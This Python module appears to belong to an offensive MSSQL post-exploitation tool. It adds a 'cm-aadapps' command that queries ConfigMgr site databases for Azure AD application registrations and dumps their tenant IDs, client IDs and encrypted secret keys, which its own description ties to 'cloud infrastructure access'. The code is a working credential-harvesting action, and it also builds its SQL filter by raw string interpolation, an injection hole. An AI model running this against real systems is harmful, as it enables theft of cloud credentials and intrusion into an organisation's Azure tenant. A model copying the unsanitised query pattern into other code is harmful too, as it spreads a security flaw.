# mssqlclient_ng/core/actions/configmgr/cm_aad_apps.py

"""Enumerate Azure AD applications stored in ConfigMgr."""

from loguru import logger

from .cm_base import CMBaseAction
from ..base import Arg
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from ...services.configmgr import CMService
from ...utils.formatters import OutputFormatter

@ActionFactory.register(
    "cm-aadapps",
    "Enumerate Azure AD app registrations with encrypted secrets for cloud infrastructure access.",
    aliases=["cm-aad-apps", "cm-aad"],
)
class CMAadApps(CMBaseAction):

    _filter = Arg(position=0, short_name="f", long_name="filter", default="", description="Filter by application name")

    def execute(self, database_context: DatabaseContext) -> list | None:
        filter_msg = f" (filter: {self._filter})" if self._filter else ""
        logger.info(f"Enumerating Azure AD applications{filter_msg}")

        databases = self._get_databases(database_context)
        if not databases:
            return None

        for db in databases:
            site_code = CMService.get_site_code(db)
            logger.info(f"ConfigMgr database: {db} (Site Code: {site_code})")

            where = ""
            if self._filter:
                where = f"WHERE a.Name LIKE '%{self._filter}%'"

            query = f"""
SELECT
    a.ID,
    t.TenantID,
    t.Name AS TenantName,
    a.ClientID,
    a.Name AS ApplicationName,
    a.LastUpdateTime,
    CONVERT(VARCHAR(MAX), a.SecretKey, 1) AS SecretKey,
    CONVERT(VARCHAR(MAX), a.SecretKeyForSCP, 1) AS SecretKeyForSCP
FROM [{db}].dbo.AAD_Application_Ex a
LEFT JOIN [{db}].dbo.AAD_Tenant_Ex t ON t.ID = a.TenantDB_ID
{where}
ORDER BY a.LastUpdateTime DESC;"""

            try:
                results = database_context.query_service.execute(query)
                if results:
                    logger.success(f"Found {len(results)} Azure AD application(s)")
                    print(OutputFormatter.convert_list_of_dicts(results))
                else:
                    logger.warning("No Azure AD applications found")
            except Exception as ex:
                logger.error(f"Failed to enumerate AAD apps: {ex}")

        return results
